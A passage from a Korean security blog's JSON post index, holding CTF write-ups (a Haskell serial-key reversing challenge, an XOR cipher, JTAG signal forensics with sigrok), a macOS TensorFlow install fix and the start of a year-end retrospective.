class=\"p\">,</span><span class=\"mi\">48</span><span class=\"p\">,</span><span class=\"mi\">102</span><span class=\"p\">,</span><span class=\"mi\">85</span><span class=\"p\">,</span><span class=\"mi\">53</span><span class=\"p\">]</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"n\">a</span><span class=\"p\">:</span>\n<span class=\"o\">...</span>     <span class=\"k\">print</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">),</span>\n<span class=\"o\">...</span>\n<span class=\"n\">F</span> <span class=\"n\">l</span> <span class=\"n\">a</span> <span class=\"n\">g</span> <span class=\"p\">{</span> <span class=\"n\">S</span> <span class=\"mi\">0</span> <span class=\"n\">m</span> <span class=\"n\">e</span> <span class=\"mi\">0</span> <span class=\"n\">f</span> <span class=\"n\">U</span> <span class=\"mi\">5</span>\n</code></pre></div></div>\n<p><br /></p>\n\n<p>두번째 구간에 해당 하는 비교 부분은 아래와 같다.</p>\n<pre><code class=\"language-Haskell\">(: (C# 103)\n    (: (C# 110)\n        (: (C# 105)\n            (: (C# 107)\n                (: loc_7168872\n                    (: loc_7168872\n                        (: (C# 76)\n                            (: (C# 51)\n                                (: (C# 114)\n                                    (: (C# 52) [])))))))))) of\n</code></pre>\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">103</span><span class=\"p\">,</span><span class=\"mi\">110</span><span class=\"p\">,</span><span class=\"mi\">105</span><span class=\"p\">,</span><span class=\"mi\">107</span><span class=\"p\">,</span><span class=\"mi\">48</span><span class=\"p\">,</span><span class=\"mi\">48</span><span class=\"p\">,</span><span class=\"mi\">76</span><span class=\"p\">,</span><span class=\"mi\">51</span><span class=\"p\">,</span><span class=\"mi\">114</span><span class=\"p\">,</span><span class=\"mi\">52</span><span class=\"p\">]</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"n\">b</span><span class=\"p\">:</span>\n<span class=\"o\">...</span>     <span class=\"k\">print</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">),</span>\n<span class=\"o\">...</span>\n<span class=\"n\">g</span> <span class=\"n\">n</span> <span class=\"n\">i</span> <span class=\"n\">k</span> <span class=\"mi\">0</span> <span class=\"mi\">0</span> <span class=\"n\">L</span> <span class=\"mi\">3</span> <span class=\"n\">r</span> <span class=\"mi\">4</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"s\">\"g n i k 0 0 L 3 r 4\"</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">r</span><span class=\"p\">[::</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span>\n<span class=\"s\">'4 r 3 L 0 0 k i n g'</span>\n</code></pre></div></div>\n\n<p>세번째 구간에 해당하는 비교 부분은 아래와 같다.</p>\n<pre><code class=\"language-Haskell\">(== $fEqChar (!! s1bb_info 0) (!! s1b3_info loc_7172456)) (&amp;&amp;\n    (== $fEqChar (!! s1bb_info 1) (!! s1b4_info (I# 19))) (&amp;&amp;\n        (== $fEqChar (!! s1bb_info 2) (!! s1b3_info (I# 19))) (&amp;&amp;\n            (== $fEqChar (!! s1bb_info 3) (!! s1b4_info 7)) (&amp;&amp;\n                (== $fEqChar (!! s1bb_info 4) (!! s1b2_info 2)) (&amp;&amp;\n                    (== $fEqChar (!! s1bb_info 5) (!! s1b3_info (I# 18))) (&amp;&amp;\n                        (== $fEqChar (!! s1bb_info 6) (!! s1b4_info (I# 19))) (&amp;&amp;\n                            (== $fEqChar (!! s1bb_info 7) (!! s1b2_info 3)) (&amp;&amp;\n                                (== $fEqChar (!! s1bb_info 8) (!! s1b4_info (I# 17)))\n                                    (== $fEqChar (!! s1bb_info 9) (!! s1b4_info (I# 18))))))))))) of\n&lt;tag 1&gt; -&gt; putStrLn (unpackCString# \":p\"),\nc1tb_info_case_tag_DEFAULT_arg_0@_DEFAULT -&gt; putStrLn (unpackCString# \"Correct Serial Key! Auth Flag!\"))\n</code></pre>\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b3_info</span> <span class=\"o\">=</span> <span class=\"s\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b2_info</span> <span class=\"o\">=</span> <span class=\"s\">\"1234567890\"</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b4_info</span> <span class=\"o\">=</span> <span class=\"s\">\"abcdefghijklmnopqrstuvwxyz\"</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b3_info</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span>\n<span class=\"s\">'A'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b4_info</span><span class=\"p\">[</span><span class=\"mi\">19</span><span class=\"p\">]</span>\n<span class=\"s\">'t'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b3_info</span><span class=\"p\">[</span><span class=\"mi\">19</span><span class=\"p\">]</span>\n<span class=\"s\">'T'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b4_info</span><span class=\"p\">[</span><span class=\"mi\">7</span><span class=\"p\">]</span>\n<span class=\"s\">'h'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b2_info</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]</span>\n<span class=\"s\">'3'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b3_info</span><span class=\"p\">[</span><span class=\"mi\">18</span><span class=\"p\">]</span>\n<span class=\"s\">'S'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b4_info</span><span class=\"p\">[</span><span class=\"mi\">19</span><span class=\"p\">]</span>\n<span class=\"s\">'t'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b2_info</span><span class=\"p\">[</span><span class=\"mi\">3</span><span class=\"p\">]</span>\n<span class=\"s\">'4'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b4_info</span><span class=\"p\">[</span><span class=\"mi\">17</span><span class=\"p\">]</span>\n<span class=\"s\">'r'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">s1b4_info</span><span class=\"p\">[</span><span class=\"mi\">18</span><span class=\"p\">]</span>\n<span class=\"s\">'s'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">AtTh3St4rs</span>\n</code></pre></div></div>\n<p><br /></p>\n\n<blockquote>\n  <p>각 구간별, string을 합치면 <code class=\"highlighter-rouge\">Flag{S0me0fU5#4r3L00king#AtTh3St4rs</code>임을 알 수 있으며, input serial로 입력할 경우 Flag를 확인할 수 있다.</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-06-Codegate-CTF-Easy-Serial-350/result.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] result</i></p>\n\n<p align=\"right\"><strong>Flag{S0me0fU5_4r3L00king_AtTh3St4rs}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_AceBear_CTF] Forensic/MISC Welcome(100)",
      "category" : "CTF2018_AceBear",
      "tags"     : "ctf, Forensic, MISC, xor",
      "url"      : "/ctf/2018_acebear/2018/01/31/AceBear-CTF-Welcome-100/",
      "date"     : "2018-01-31 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Welcome to AceBear Security Contest:<br />\nCipher:</p>\n</blockquote>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>172d330d21283133037c65101220703c187a3b1033202f24092c33103021261721273821773b3e\n</code></pre></div></div>\n<blockquote>\n  <p>author: komang4130</p>\n</blockquote>\n\n<p><img src=\"/images/2018-01-31-AceBear-CTF-Welcome-100/exercise.png\" alt=\"\" /></p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>Cipher Text가 하나 주어진다. 해당 Cipher 를 Plain Text 로써 의미있는 문자열로 복호화 해내는 문제.\n감이 모자란지라,, 처음엔 ROT, Hex Decoding 등으로 다르게 접근 했었는데 flag format 과 xor을 이용해서 해결할 수 있었다.</p>\n\n<blockquote>\n  <ol>\n    <li>cipher를 hex 형태로 convert 해야한다.</li>\n  </ol>\n</blockquote>\n\n<blockquote>\n  <ol>\n    <li>flag format이 ‘AceBear{‘ 임을 이미 알고 있기 때문에, 해당 길이만큼 hex로 decode 한 cipher에 대해 xor 하여 flag format text 가 생성되는 xor key를 찾을 수 있다. (VNVODICH)</li>\n  </ol>\n</blockquote>\n\n<blockquote>\n  <ol>\n    <li>cipher 와 찾은 xor key를 이용하여 다시 xor을 수행함으로써, flag를 확인할 수 있다.</li>\n  </ol>\n</blockquote>\n\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span>\n<span class=\"s\">'172d330d21283133037c65101220703c187a3b1033202f24092c33103021261721273821773b3e'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s\">'hex'</span><span class=\"p\">)</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span>\n<span class=\"s\">\"</span><span class=\"se\">\\x17</span><span class=\"s\">-3</span><span class=\"se\">\\r</span><span class=\"s\">!(13</span><span class=\"se\">\\x03</span><span class=\"s\">|e</span><span class=\"se\">\\x10\\x12</span><span class=\"s\"> p&lt;</span><span class=\"se\">\\x18</span><span class=\"s\">z;</span><span class=\"se\">\\x10</span><span class=\"s\">3 /$</span><span class=\"se\">\\t</span><span class=\"s\">,3</span><span class=\"se\">\\x10</span><span class=\"s\">0!&amp;</span><span class=\"se\">\\x17</span><span class=\"s\">!'8!w;&gt;\"</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">b</span>\n<span class=\"s\">'</span><span class=\"se\">\\x17</span><span class=\"s\">-3</span><span class=\"se\">\\r</span><span class=\"s\">!(13'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">plain</span>\n<span class=\"s\">'AceBear{'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">xor</span><span class=\"p\">(</span><span class=\"n\">plain</span><span class=\"p\">,</span><span class=\"n\">b</span><span class=\"p\">)</span>\n<span class=\"s\">'VNVODICH'</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">xor</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">,</span><span class=\"s\">\"VNVODICH\"</span><span class=\"p\">)</span>\n<span class=\"s\">'AceBear{U23_Vi3tN4m_will_be_the_winn3r}'</span>\n</code></pre></div></div>\n\n<p align=\"right\"><strong>AceBear{U23_Vi3tN4m_will_be_the_winn3r}</strong></p>\n"
    } ,
  
    {
      "title"    : "OSX Tensorflow Install",
      "category" : "etc",
      "tags"     : "etc, tensorflow, error",
      "url"      : "/etc/2018/01/26/OSX-Tensorflow-Install/",
      "date"     : "2018-01-26 00:00:00 +0900",
      "content"   : "<p>Lab3 예제 code를 Docker에서 실습하던 중에, gvs optimizer 가 type error 뜨는 것을 확인.. 고치려고 별 짓을 다했으나 결국 version 문제인것으로 확인했다… Docker 끄고.. 로컬에 설치 시작..</p>\n\n<ul>\n  <li>아래처럼 하면, 정상적으로 설치 되지 않는다…</li>\n</ul>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo </span>pip3 install tensorflow\n</code></pre></div></div>\n\n<p>문제를 찾아보면, Max OS에서 정상적으로 version이 호환되지 않는 문제인데,, 아래와 같은 error 를 볼 수 있다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>python3\nPython 3.6.3 <span class=\"o\">(</span>default, Oct  4 2017, 06:09:15<span class=\"o\">)</span>\n<span class=\"o\">[</span>GCC 4.2.1 Compatible Apple LLVM 9.0.0 <span class=\"o\">(</span>clang-900.0.37<span class=\"o\">)]</span> on darwin\nType <span class=\"s2\">\"help\"</span>, <span class=\"s2\">\"copyright\"</span>, <span class=\"s2\">\"credits\"</span> or <span class=\"s2\">\"license\"</span> <span class=\"k\">for </span>more information.\n<span class=\"o\">&gt;&gt;&gt;</span> import tensorflow\n/usr/local/Cellar/python3/3.6.3/Frameworks/Python.framework/Versions/3.6/lib/python3.6/importlib/_bootstrap.py:219: RuntimeWarning: compiletime version 3.5 of module <span class=\"s1\">'tensorflow.python.framework.fast_tensor_util'</span> does not match runtime version 3.6\n  <span class=\"k\">return </span>f<span class=\"o\">(</span><span class=\"k\">*</span>args, <span class=\"k\">**</span>kwds<span class=\"o\">)</span>\n<span class=\"o\">&gt;&gt;&gt;</span> quit<span class=\"o\">()</span>\n</code></pre></div></div>\n\n<p>좀 뒤져보면, (https://github.com/tensorflow/tensorflow/issues/14273)</p>\n\n<p><img src=\"/images/2018-01-26-OSX-Tensorflow-Install/issue.png\" alt=\"\" /></p>\n\n<ul>\n  <li>\n    <p>https://github.com/lakshayg/tensorflow-build/releases/download/v1.4.1-macosx_10_12-py27-py36-avx-sse41-sse42/tensorflow-1.4.1-cp36-cp36m-macosx_10_12_x86_64.whl</p>\n  </li>\n  <li>\n    <p>위 github 주소에서 직접, version에 맞는 tensor flow를 빌드할 수 있는 whl을 제공하고 있다. 내  Mac 버전과, Python3 버전이 동일한 항목을 찾아 직접 다운로드 해주도록 한다.</p>\n  </li>\n</ul>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo </span>pip3 install <span class=\"nt\">--ignore-installed</span> <span class=\"nt\">--upgrade</span> https://github.com/lakshayg/tensorflow-build/raw/master/tensorflow-1.4.0-cp36-cp36m-macosx_10_12_x86_64.whl\n</code></pre></div></div>\n\n<ul>\n  <li>위에서 안되던, 예제 Code가 잘~ 돌아가는 것을 확인할 수 있다.</li>\n</ul>\n\n"
    } ,
  
    {
      "title"    : "[2017_SHA_CTF] Samsung S4 (300)",
      "category" : "CTF2017_SHA",
      "tags"     : "Forensic, JTAG, SHA CTF, Writeup",
      "url"      : "/ctf/2017_sha/2018/01/13/SHA-CTF-Samsung-S4-300/",
      "date"     : "2018-01-13 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>A forenic investigator was wondering how hacker boxes like RIFF and Z3X use JTAG on a Samsung S4 phone while the main cores have debugging disabled.</p>\n</blockquote>\n\n<blockquote>\n  <p>Challenge created by the Digital and Biometric Traces division of the Netherlands Forensic Institute.</p>\n</blockquote>\n\n<p><img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/0_exercise.png\" alt=\"\" /></p>\n\n<ul>\n  <li>\n    <p>2017년 8월에 참가했었던 SHA CTF 에서 나온 Forensic 문제. Samsung Galaxy S4 JTAG 관련 문제이다. 대회 당시에 이게 뭔가.. 하고 살펴보다가 벙쪄서 못 풀었었다. Forensic CTF 문제에서 보기 드문 형태로 나온 유형이라 기억에 남아서 <code class=\"highlighter-rouge\">\"나중에 Writeup이 나오면 보거나, 꼭 다시 풀어봐야지\"</code>하고 아껴(?)왔다. 참가했던 CTF 중 못 푼 문제들 스택 처리를 계속 계획에 염두해오고 있던터라, 이번 기회에 바로 다시 풀어보았다.</p>\n  </li>\n  <li>\n    <p>사실, 대회가 끝나고 바로 재도전 했었지만 도저히 어떻게 풀어나가야 할지 감이 잡히질 않아 해당 문제를 풀이 했던 <code class=\"highlighter-rouge\">HackingForSoju</code> 팀의 <code class=\"highlighter-rouge\">zeta-two</code>에게 팀원 중 해당 문제를 푼 사람을 통해 어떻게 접근한 건지 알려줄 수 있냐고 요청 메일까지 보내며 풀어보고자 했던 문제이다.. (아래는 친철하게 힌트를 알려준 <code class=\"highlighter-rouge\">zeta two</code>의 메일)</p>\n  </li>\n</ul>\n\n<blockquote>\n  <p>Hi!</p>\n</blockquote>\n\n<blockquote>\n  <p>For Forensics 300 my teammate is working on a write-up but I can tell you that you can load the data in siggrok and use the JTAG parser. From there you will see that it is reading the data register (DR) over and over. So just decode each 34(!) bit value and you have the flag.<br /></p>\n</blockquote>\n\n<blockquote>\n  <p>Greetings<br />\nCalle “Zeta Two” Svensson<br />\nHackingForSoju<br /></p>\n</blockquote>\n\n<hr />\n<h2 id=\"solution\">Solution</h2>\n\n<p>먼저, 문제에서 언급된 내용을 살펴보면 Forensic 연구원이 <code class=\"highlighter-rouge\">RIFF</code>, <code class=\"highlighter-rouge\">Z3X</code>와 같은 도구를 사용해 Samsung S4 기기의 <code class=\"highlighter-rouge\">JTAG</code> 를 사용하는 방식에 대해 궁금했다고 한다. 첨부 파일을 확인하기 전에 문제를 풀 당시, JTAG을 제외하곤 생소한 단어였기 때문에 정리가 필요했다.</p>\n\n<ul>\n  <li>\n    <h5 id=\"jtag\">JTAG?</h5>\n    <blockquote>\n      <p><code class=\"highlighter-rouge\">Joint Test Action Group</code>, 임베디드 시스템 개발 시에 사용하는 디버깅 장비.</p>\n    </blockquote>\n\n    <ul>\n      <li>\n        <h6 id=\"interface--아래와-같은-핀으로-칩-내에-구성되어-있다\">Interface : 아래와 같은 핀으로 칩 내에 구성되어 있다.</h6>\n        <ul>\n          <li>TDI (데이터 입력) :: Test하기 위한 데이터 신호. TMS에 의해 전이된 TAP state에 따라, TDI가 command/data 가 결정됨</li>\n          <li>TDO (데이터 출력) :: Test한 결과를 외부에서 모니터링 하기 위한 pin, 이 역시 TAP state에 따라 address/data가 될 수 있음.</li>\n          <li>TCK (클럭) :: Test clock</li>\n          <li>TMS (모드) :: Test Mode 전환하기 위한 제어 신호</li>\n          <li>TRST (리셋)</li>\n        </ul>\n      </li>\n    </ul>\n  </li>\n</ul>\n\n<p><img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/1_jtag_interface.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] JTAG interface</p>\n\n<ul>\n  <li>\n    <h5 id=\"riff\">RIFF?</h5>\n    <blockquote>\n      <p>JTAG 신호를 PC 에서 조작 가능하도록 변환해주는 장비.\n스마트폰 Flash Memory Dump 용도로 사용할 수 있다.</p>\n    </blockquote>\n  </li>\n</ul>\n\n<p><img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/2_riff.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] RIFF (출처 : JTAG를 이용한 스마트폰 플래시 메모리 덤프 - 박상호)</p>\n\n<ul>\n  <li>\n    <h5 id=\"z3x\">Z3X?</h5>\n    <blockquote>\n      <p>RIFF 와 같이 Flash Dump 를 위해 사용되는 장비로써, 찾아보면 Samsung 스마트폰 기종에 대해서 JTAG 를 손쉽게 활성화하여 Root, Unlock 작업을 할 수 있다고 나와았다. (구매 욕구가..)</p>\n    </blockquote>\n  </li>\n</ul>\n\n<p><img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/3_z3x.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] Z3X </p>\n\n<p><br />\n문제에서 주어진 첨부파일을 확인해보면, <code class=\"highlighter-rouge\">samsungs4.tgz</code> 파일을 확인할 수 있다. 해당 파일의 압축을 풀면 <code class=\"highlighter-rouge\">CTF_SamsungS4.csv</code> 파일을 확인할 수 있는데 아래와 같은 내용을 포함하고 있다.\n<img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/4_csv.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] CTF_SamsungS4.csv</p>\n\n<p>문제에서 언급한 장비로 s4 기기에 대한 JTAG 신호를 기록한 것으로 보이며, 이를 의미있는 데이터로 변환해야하는 것으로 보였다. 대회 당시에는 JTAG 신호를 어떻게 분석해야 할지 하드웨어적인 지식이 전혀 없어 여러 삽질을 했었는데 결과적으로 <code class=\"highlighter-rouge\">zeta-two</code>로 부터 얻은 Hint 를 통해 <code class=\"highlighter-rouge\">sigrok</code>이라는 도구를 이용해 문제를 해결했다.</p>\n\n<p>CSV 내용을 보면, TimeStamp 별로 TMS, TCK, TDI, TDO 핀의 신호가 기록되있는 것을 확인할 수 있다. 이를 어떻게 분석할 수 있는 시각적 데이터로 변환해야하는가? 가 관건이었는데, 처음 내가 접근했던 방식은 “http://www2.lauterbach.com/pdf/training_jtag.pdf” 을 보고 JTAG data 가 가지는 의미 등에 대해 파악하는 것이었다.\n<img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/5_jtag_training.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] JTAG core process</p>\n\n<p>Shift-IR, DR 등의 자료가 나오고 JTAG 신호를 처리하는 Process 등에 대해 살펴보고 해당 CSV 데이터를 동일하게 처리하는 방식으로 하려 했지만, 생판 모르는 JTAG 자료를 보고 따라하려니 뭐가 뭔지 도통 알아먹을 수 없었다…. 그렇게 해당 방식은 뒤로하고, <code class=\"highlighter-rouge\">sigrok</code> 도구를 이용하기로 했다. <code class=\"highlighter-rouge\">sigrok</code>은 신호 분석용 오픈소스 도구이다. 다양한 플랫폼, 신호 분석과 디코더를 지원한다. CSV 를 바로 업로드 할 수 있는 기능이 있어 편하게 해당 데이터를 신호로 변환하여 열어볼 수 있었다. 본래 CSV 에 포함되어 있는 TimeStamp는 분석이 되지 않으므로, Header Row 와 TimeStamp Column 을 제거했다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cat</span> ./CTF_SamsungS4_@.csv | tail <span class=\"nt\">-n</span>+2 | awk <span class=\"s1\">'{print $2 $3 $4 $5}'</span> <span class=\"o\">&gt;</span> ./reData.csv\n</code></pre></div></div>\n\n<p>데이터만 남겨놓은 파일로 대체한 뒤, <code class=\"highlighter-rouge\">sigrok</code>에서 QT 로 GUI를 지원하는 <code class=\"highlighter-rouge\">pulseview</code>를 이용해 해당 CSV 데이터를 분석할 수 있다. <code class=\"highlighter-rouge\">pulseview</code>로 로드하면 아래와 같은 시그널을 확인할 수 있다. 좌측에 해당 시그널의 명칭이 빠져있는데, 각각 TMS, TCK, TDI, TDO 순이므로 클릭하여 입력하면 수정할 수 있다.\n<img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/6_pulseview.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] pulseview signal</p>\n\n<p>해당 시그널이 의미하는 바와, 담긴 정보를 찾기 위해 JTAG 신호를 Decode 해야하며 Decoder 탭에서, 사용할 Decoder 로 JTAG 를 선택할 수 있다. 확대해서 확인해보면, SHIFT-IR, SHIFT-DR 등의 구간이 정상적으로 식별되는 것을 확인할 수 있다. (원래 Decoder 를 누른 뒤, TDI, TDO, TMS 등의 시그널을 맞춰 주어야하는데 알아서, 잘 맞춰져서 넘어갔다.)\n<img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/7_jtag_decoder.png\" alt=\"\" />\n<img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/8_jtag_decoder.png\" alt=\"\" />\n<img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/9_jtag_decoder.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] JTAG decode</p>\n\n<p>여기까지 진행하고 난 뒤에도 살짝 당황스러웠던게, Decoder 라해서 signal을 식별가능한 Text 로 변환해주는 줄 알았는데 JTAG spec 으로 변환해주는 것이었다..\nTDI는 디바이스로 들어가는 데이터를 표시하며, TDO는 디바이스로부터 나오는 데이터를 표시한다. 여기에서 또, 상당이 애먼 시간을 쏟았는데 결과적으로 JTAG의 TMS, TCK, TDI, TDO 시그널을 SPI decoder 를 이용해 Bitstream 으로 변환할 수 있다는 사실을 알 수 있었다. (SPI가 정확하게 어떤 무엇인지, 각 정보들을 정확하게 이해하고 싶었지만, 너무 까다로운 정보들이라.. 정확한 이해는 하지 못했다.)\n<img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/10_spi.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] JTAG to SPI</p>\n\n<p>마침, <code class=\"highlighter-rouge\">pulseview</code>에서도 <code class=\"highlighter-rouge\">SPI</code> decoder 를 지원하고 있었고, 아래와 같이 decoder를 추가한 뒤, Setting을 거쳐 작업을 수행할 수 있었다. 설정한 부분은 아래와 같은데 각각 다음과 같다.</p>\n<ul>\n  <li>CLK : <code class=\"highlighter-rouge\">clock</code> 을 의미하는데 <code class=\"highlighter-rouge\">TCK</code>가 <code class=\"highlighter-rouge\">test clock</code>을 의미하므로 <code class=\"highlighter-rouge\">TCK</code>로 설정했다.</li>\n  <li>MISO : <code class=\"highlighter-rouge\">Master in, Slave out</code>으로써, slave out은 SPI decoder 로 들어가는 데이터를 의미하기 때문에, JTAG에서 디바이스로부터 나오는 데이터인 <code class=\"highlighter-rouge\">TDO</code>로 설정했다.</li>\n  <li>CS# : <code class=\"highlighter-rouge\">Chip Select</code>를 의미하는데, 제어 신호로써 <code class=\"highlighter-rouge\">TMS</code>가 사용되기 때문에 <code class=\"highlighter-rouge\">TMS</code>를 설정했다.</li>\n  <li>Word size : 변환되는 구간을 의미하는 것 같다. 처음에 8로 설정되어 있는데 아래 그림에 표시된 decode 결과가 TMS pulse 가 1인 구간 내에서 일부분만 변환을 하기에 해당 구간 내 모든 데이터를 변환하기 위해 구간 길이인 35로 설정했다.</li>\n</ul>\n\n<p><img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/11_spi_decoder.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] SPI decoder setting</p>\n\n<p>위 설정 값을 지정할 때마다, 디코딩 결과를 실시간으로 확인할 수 있었는데 위와 같은 설정을 했을때, 아래 그림과 같이 눈에 익는 Bitstream 을 확인할 수 있었다.\n<img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/12_spi_decoder.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] SPI decoder result</p>\n\n<p>바로, ASCII 범위 내 값이 반환 된 것인데 아래 표시된 bitstream을 ASCII 값으로 변환 해보면 “galf” 즉 “flag” 인 것을 알 수 있다.(little endian) ASCII 값이 식별되는 sampling 범위는 약 +2500s ~ +4200s 구간이다. \\x00 로 끝임을 예상할 수 있다.\n<img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/13_ascii_area.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] ASCII bitstream area</p>\n\n<p>해당 bitstream 을 적은 뒤, Python으로 Hex decoding 을 할 경우 아래와 같이 Flag 를 확인할 수 있었다.\n<img src=\"/images/2018-01-13-SHA-CTF-Samsung-S4-300/14_flag.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] Flag</p>\n\n<p align=\"right\"><strong>flag{9a0e5c94ac3e38719130ab133cfbfe18}</strong></p>\n\n<hr />\n<h2 id=\"finish\">Finish</h2>\n<blockquote>\n  <p>계속 염두하고 있던, 문제 하나를 해결해서 개운한 느낌이다. 하지만, 아직 궁금증이 해결되지 않은 부분이 너무 많다. SPI며, JTAG, RIFF Box, Signal Analysis 등 하드웨어 분야 또한 상당히 매료되는데, 기회가 되면 한번 제대로 공부를 해보고 싶다.. Mobile Forensic 공부할 때, Z3X 구매해서 한번 실습해 볼까…싶다..</p>\n</blockquote>\n\n<blockquote>\n  <p>내가 푼 방식 말고, 처음에 JTAG Process 를 이해하고 이를 이용해 문제를 해결한 방식으로 푼 writeup이 CTFtime에 올라와 있길래 첨부해 둔다. 도구 쓴게 하나도 없고 오로지 Instruction 문서랑 Python으로만 해결한 것 같다. 이렇게 풀고 싶었는데 보고나니 뭔가 아쉽다..\n    - http://karabut.com/sha2017-ctf-samsung-s4-writeup.html</p>\n</blockquote>\n\n<p><br /></p>\n<h4 id=\"reference\">Reference</h4>\n<ul>\n  <li>Using SPI Flash with 7 Series FPGAs Application Note (https://www.xilinx.com/support/documentation/application_notes/xapp586-spi-flash.pdf)</li>\n  <li>SPI (https://ko.wikipedia.org/wiki/%EC%A7%81%EB%A0%AC_%EC%A3%BC%EB%B3%80%EA%B8%B0%EA%B8%B0<em>%EC%9D%B8%ED%84%B0%ED%8E%98%EC%9D%B4%EC%8A%A4</em>%EB%B2%84%EC%8A%A4)</li>\n  <li>Training jtag interface (http://www2.lauterbach.com/pdf/training_jtag.pdf)</li>\n  <li>JTAG work (http://www.fpga4fun.com/JTAG2.html)</li>\n  <li>JTAG를 이용한 스마트폰 플래시 메모리 덤프 (http://for-md.org/wp-content/uploads/2015/01/JTAG%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-%EC%8A%A4%EB%A7%88%ED%8A%B8%ED%8F%B0-%ED%94%8C%EB%9E%98%EC%8B%9C-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%8D%A4%ED%94%84.pdf)</li>\n</ul>\n\n"
    } ,
  
    {
      "title"    : "2017년 회고록",
      "category" : "life",
      "tags"     : "life",
      "url"      : "/life/2017/12/31/2017%EB%85%84-%ED%9A%8C%EA%B3%A0%EB%A1%9D/",
      "date"     : "2017-12-31 00:00:00 +0900",
